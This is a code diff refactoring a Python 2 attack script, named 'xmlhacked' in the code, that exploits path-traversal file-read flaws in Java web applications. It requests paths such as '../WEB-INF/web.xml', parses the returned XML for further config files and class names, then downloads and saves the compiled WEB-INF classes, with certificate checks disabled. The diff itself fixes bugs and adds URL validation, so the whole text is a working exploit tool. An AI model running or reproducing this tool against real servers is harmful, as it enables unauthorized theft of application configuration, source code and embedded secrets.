@@ -1,11 +1,10 @@
 import optparse
 import os
 import re
-from xml.dom.minidom import parseString
-import xml.dom.minidom
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-import requests
 import sys
+
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 reload(sys)
 sys.setdefaultencoding( "utf-8" )
@@ -13,36 +12,49 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
 class xmlhacked():
-    def __init__(self, xmlurl, data=None, \
-            datatype="application/x-www-form-urlencoded",
-            cookie=""):
+    def __init__(self, url, data=None, \
+            datatype=None, cookie=None):
         '''
         https://xxx.xxxx/?url=../WEB-INF/web.xml
         or 
         https://xxx.xxx/
         -p"url=../WEB-INF/web.xml"
         '''
-        self.xmlurl = xmlurl
+        self.url = xmlhacked.check_url(url)
         self.data = data
+        if not datatype:
+            datatype = "application/x-www-form-urlencoded"
         self.headers = {
             "User-Agent": "Mozilla/5.0 \
                 (Windows NT 10.0; Win64; x64) \
                 AppleWebKit/537.36 (KHTML, like \
                 Gecko) Chrome/73.0.3683.47 Safari/537.36",
             "Content-Type": datatype,
-            "Cookie": cookie
+            "Cookie": cookie,
         }
         self.dict = []
         self.properties = [
             "WEB-INF/classes/application.properties",
         ]
-        self.path = self.xmlurl.split("/")[2]
+        self.path = self.url.split("/")[2]
         self.pattern = re.compile("WEB-INF/[/0-9a-zA-Z_\*]+\.xml")
         self.class_pattern = re.compile("<[a-zA-Z]+-class>([0-9a-zA-Z_\.]*?)</[a-zA-Z]+-class>")
         self.class_ = []
         self.filelist = []
     
-
+    @staticmethod
+    def check_url(url):
+        exit_ = 0
+        if not url.startswith("http"):
+            url = "http://%s" % url
+        try:
+            requests.head(url)
+        except:
+            exit_ = 1
+        if exit_:
+            print("[-] url worry")
+            sys.exit(0)
+        return url
 
     def get_xml(self):
         dicts = ["WEB-INF/web.xml"]
@@ -59,7 +71,7 @@ class xmlhacked():
                     req = requests.post(self.url, data=data,
                             headers=self.headers, verify=False).text
                 else:
-                    url = self.pattern.sub(xml_, self.xmlurl)
+                    url = self.pattern.sub(xml_, self.url)
                     req = requests.get(url,\
                         headers=self.headers, verify=False).text
             except:
@@ -93,7 +105,7 @@ class xmlhacked():
                     req = requests.post(self.url, data=data,
                             headers=self.headers, verify=False).content
                 else:
-                    url = self.pattern.sub("WEB-INF/classes/%s" % class_, self.xmlurl)
+                    url = self.pattern.sub("WEB-INF/classes/%s" % class_, self.url)
                     req = requests.get(url,\
                         headers=self.headers, verify=False).content
             except:
@@ -102,9 +114,6 @@ class xmlhacked():
                     (self.path, class_), "w") as f:
                 f.write(req)
             
-
-    def save_file(self, filename):
-        pass
 
     def run(self):
         self.get_xml()
@@ -123,18 +132,15 @@ def main():
         help = 'content-type')
     parser.add_option('-c', dest="tgtcookie", type='string',\
         help = 'cookie')
-    ( option, parser ) = parser.parse_args()
-    xmlurl = option.tgturl
+    (option, parser) = parser.parse_args()
+    url = option.tgturl
     data = option.tgtdata
     type_ = option.tgttype
     cookie = option.tgtcookie
-    if not xmlurl:
+    if not url:
         print("[-] no url and data")
-    elif not type_:
-        target = xmlhacked(xmlurl=xmlurl,data=data)
-    else:
-        target = xmlhacked(urxmlurll=xmlurl,data=data, type=type_)
-
+        return 
+    target = xmlhacked(url=url,data=data, datatype=type_, cookie=cookie)
     target.run()
 
 
